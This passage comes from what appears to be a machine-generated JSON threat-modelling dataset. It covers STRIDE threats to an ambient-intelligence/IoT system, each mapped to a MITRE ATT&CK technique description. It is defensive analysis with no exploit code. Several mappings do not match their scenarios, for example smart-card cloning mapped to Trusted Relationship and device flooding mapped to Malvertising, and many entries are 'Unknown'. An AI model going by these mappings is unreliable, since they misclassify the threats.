                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised device leverages a vulnerability to gain higher privileges within the network.",
            "Assumptions": [
                {
                    "Assumption": "Device has known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Compromised device has exploitable flaws."
                },
                {
                    "Assumption": "No network segmentation or isolation.",
                    "Role": "System Admin",
                    "Condition": "Network architecture allows lateral movement."
                }
            ],
            "Potential Impact": "Extended control over network resources, leading to potential widespread compromise.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "network vulnerability",
                "privilege escalation",
                "lateral movement"
            ],
            "mitre_technique": {
                "name": "Component Object Model",
                "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
                "id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
                "technique_id": "T1559.001"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker exploits a weak password policy to masquerade as a legitimate user accessing the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Passwords are used for authentication",
                    "Role": "User",
                    "Condition": "Passwords are easy to guess or default passwords are unchanged"
                },
                {
                    "Assumption": "No account lockout mechanism",
                    "Role": "System Administrator",
                    "Condition": "Users can attempt multiple logins without being locked out"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and user profiles, potential manipulation of system settings.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "weak password"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and reuses biometric data transmitted over an insecure network.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data is not encrypted during transmission",
                    "Role": "System Designer",
                    "Condition": "Network transmission is not properly secured"
                },
                {
                    "Assumption": "Potential for man-in-the-middle attacks",
                    "Role": "Network Administrator",
                    "Condition": "Lack of network security measures like SSL/TLS"
                }
            ],
            "Potential Impact": "Unauthorized access resulting from reused biometric data, possible compromise of user privacy.",
            "MITRE ATT&CK Keywords": [
                "biometric spoofing",
                "man-in-the-middle",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a cloned smart card to access the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Smart cards used for authentication",
                    "Role": "User",
                    "Condition": "Smart cards can be easily cloned"
                },
                {
                    "Assumption": "Inadequate physical security",
                    "Role": "Security Personnel",
                    "Condition": "Smart cards are not stored securely"
                }
            ],
            "Potential Impact": "Physical and logical unauthorized access resulting in potential data theft and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "smart card spoofing",
                "physical security",
                "cloning"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies sensor firmware to provide false data.",
            "Assumptions": [
                {
                    "Assumption": "Access to sensor hardware",
                    "Role": "Attacker",
                    "Condition": "Sensor hardware can be physically or remotely accessed"
                },
                {
                    "Assumption": "Firmware update process is not secure",
                    "Role": "System Administrator",
                    "Condition": "Firmware can be updated without security checks"
                }
            ],
            "Potential Impact": "Incorrect decisions made by the AmI system, potentially leading to unsafe or undesired outcomes.",
            "MITRE ATT&CK Keywords": [
                "firmware manipulation",
                "sensor tampering",
                "hardware access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to cloud storage and alters user profile data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is used for data storage",
                    "Role": "System Designer",
                    "Condition": "Cloud security measures are weak"
                },
                {
                    "Assumption": "Credentials can be compromised",
                    "Role": "User",
                    "Condition": "Credentials are weak or reused"
                }
            ],
            "Potential Impact": "Compromised integrity of user data, potentially leading to inappropriate system responses.",
            "MITRE ATT&CK Keywords": [
                "cloud storage tampering",
                "credential compromise",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious software is installed on user devices, altering data sent to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack adequate malware protection",
                    "Role": "User",
                    "Condition": "Antivirus or anti-malware solutions are absent or outdated"
                },
                {
                    "Assumption": "Device access is not restricted",
                    "Role": "User",
                    "Condition": "Weak physical and software security controls"
                }
            ],
            "Potential Impact": "Misinformation being fed to the system, leading to incorrect decision-making and actions.",
            "MITRE ATT&CK Keywords": [
                "malware installation",
                "user device tampering",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Process Doppelg\u00e4nging",
                "description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nProcess Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):\n\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197",
                "technique_id": "T1055.013"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user performs an action on the system and later denies it.",
            "Assumptions": [
                {
                    "Assumption": "Lack of adequate logging",
                    "Role": "System Administrator",
                    "Condition": "System does not log actions appropriately"
                },
                {
                    "Assumption": "Inadequate non-repudiation mechanisms",
                    "Role": "System Designer",
                    "Condition": "System lacks non-repudiation controls"
                }
            ],
            "Potential Impact": "Difficulty in tracing actions to the rightful user, leading to accountability issues.",
            "MITRE ATT&CK Keywords": [
                "action denial",
                "inadequate logging",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "System logs are altered to erase the traces of unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Access to logging systems",
                    "Role": "Attacker",
                    "Condition": "Logging systems are not properly secured"
                },
                {
                    "Assumption": "Logs are not protected/encrypted",
                    "Role": "System Administrator",
                    "Condition": "Logs can be accessed and modified without detection"
                }
            ],
            "Potential Impact": "Loss of forensic details necessary for incident investigation, complicating accountability and recovery.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "forensic tampering",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A system malfunction results in erroneous logs that indicate a user took actions they did not actually take.",
            "Assumptions": [
                {
                    "Assumption": "Dependence on automated logging",
                    "Role": "System Designer",
                    "Condition": "Logs are automatically generated without accuracy checks"
                },
                {
                    "Assumption": "System malfunctions are not monitored",
                    "Role": "System Administrator",
                    "Condition": "No mechanisms to detect and correct system errors"
                }
            ],
            "Potential Impact": "Misattribution of actions to wrong users, impacting user trust and system reliability.",
            "MITRE ATT&CK Keywords": [
                "system malfunction",
                "logging error",
                "user misattribution"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is intercepted during transmission due to lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Transmission without encryption protocols",
                    "Role": "System Designer",
                    "Condition": "Sensitive data sent over insecure channels"
                },
                {
                    "Assumption": "Network is susceptible to interception",
                    "Role": "Network Administrator",
                    "Condition": "Network security measures are inadequate or absent"
                }
            ],
            "Potential Impact": "Confidentiality of user data is compromised, leading to potential privacy violations.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted transmission",
                "network eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized person accesses a data repository due to weak access controls.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control mechanisms",
                    "Role": "System Administrator",
                    "Condition": "Access to data repositories is not properly restricted"
                },
                {
                    "Assumption": "No two-factor authentication",
                    "Role": "User",
                    "Condition": "Single-factor authentication is used"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, resulting in disclosure of private information.",
            "MITRE ATT&CK Keywords": [
                "data repository access",
                "weak access control",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An AI model exposes sensitive data through inference attacks.",
            "Assumptions": [
                {
                    "Assumption": "AI models have access to extensive user data",
                    "Role": "System Designer",
                    "Condition": "Models are trained on sensitive datasets"
                },
                {
                    "Assumption": "Inference controls are not implemented",
                    "Role": "System Administrator",
                    "Condition": "Lack of mechanisms to prevent data leakage through AI decisions"
                }
            ],
            "Potential Impact": "Sensitive information could be inferred from model predictions, compromising user data privacy.",
            "MITRE ATT&CK Keywords": [
                "AI inference attack",
                "data leakage",
                "model security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the communication infrastructure with excessive data, disrupting service.",
            "Assumptions": [
                {
                    "Assumption": "Absence of rate limiting",
                    "Role": "Network Administrator",
                    "Condition": "No rate limiting mechanisms in place"
                },
                {
                    "Assumption": "Network components are not monitored",
                    "Role": "System Administrator",
                    "Condition": "Lack of real-time traffic monitoring"
                }
            ],
            "Potential Impact": "Service disruption, potentially rendering the AmI system unusable for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "flooding attack",
                "network overwhelm",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Physical tampering with network routers or gateways to disrupt communication.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate physical security",
                    "Role": "Security Personnel",
                    "Condition": "Network hardware is physically accessible"
                },
                {
                    "Assumption": "No tamper detection mechanisms",
                    "Role": "System Administrator",
                    "Condition": "Hardware alterations are not monitored"
                }
            ],
            "Potential Impact": "Loss of communication between system components, leading to service unavailability.",
            "MITRE ATT&CK Keywords": [
                "physical tampering",
                "network disruption",
                "service unavailability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious code injected into user devices that causes them to constantly request data, choking the network.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack security controls",
                    "Role": "User",
                    "Condition": "Devices can execute downloaded code without restrictions"
                },
                {
                    "Assumption": "No network monitoring for anomalous behavior",
                    "Role": "Network Administrator",
                    "Condition": "Lack of mechanisms to detect and prevent unusual traffic patterns"
                }
            ],
            "Potential Impact": "Network congestion leading to degraded performance or complete denial of service.",
            "MITRE ATT&CK Keywords": [
                "malicious code",
                "network congestion",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Malvertising",
                "description": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising) ",
                "id": "attack-pattern--155207c0-7f53-4f13-a06b-0a9907ef5096",
                "technique_id": "T1583.008"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a vulnerability in the system software to gain admin privileges.",
            "Assumptions": [
                {
                    "Assumption": "Known software vulnerabilities",
                    "Role": "Software Vendor",
                    "Condition": "System runs vulnerable software versions"
                },
                {
                    "Assumption": "Lack of timely patches",
                    "Role": "System Administrator",
                    "Condition": "No regular patch management process"
                }
            ],
            "Potential Impact": "Attacker gains full control over the system, enabling further malicious actions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "software vulnerability",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insiders use their existing access to elevate their permissions beyond their intended level.",
            "Assumptions": [
                {
                    "Assumption": "Insider with basic access rights",
                    "Role": "User",
                    "Condition": "Insiders have access to sensitive components"
                },
                {
                    "Assumption": "Role-based access controls are not enforced",
                    "Role": "System Administrator",
                    "Condition": "Inadequate separation of duties and permissions"
                }
            ],
            "Potential Impact": "Unauthorized actions performed with higher privileges, possibly causing significant damage.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "access misuse",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Group Policy Discovery",
                "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
                "id": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b",
                "technique_id": "T1615"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a misconfigured cloud service to gain unauthorized access to sensitive data and functionality.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are used",
                    "Role": "System Designer",
                    "Condition": "Misconfigurations in cloud service settings"
                },
                {
                    "Assumption": "Weak API security",
                    "Role": "System Administrator",
                    "Condition": "APIs are not adequately secured against unauthorized access"
                }
            ],
            "Potential Impact": "Compromise of data integrity and confidentiality, as attackers gain higher-level access to system resources.",
            "MITRE ATT&CK Keywords": [
                "cloud service",
                "misconfiguration",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises their communication as legitimate by spoofing the identity of registered user devices to gain unauthorized access to the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker knows or can guess the credentials of legitimate user devices.",
                    "Role": "Attacker",
                    "Condition": "The IoT system does not use strong authentication methods such as mutual authentication."
                },
                {
                    "Assumption": "Network traffic is not sufficiently encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Encryption protocols are either not implemented or are configured improperly."
                },
                {
                    "Assumption": "The attacker has network access to intercept and modify communications.",
                    "Role": "Attacker",
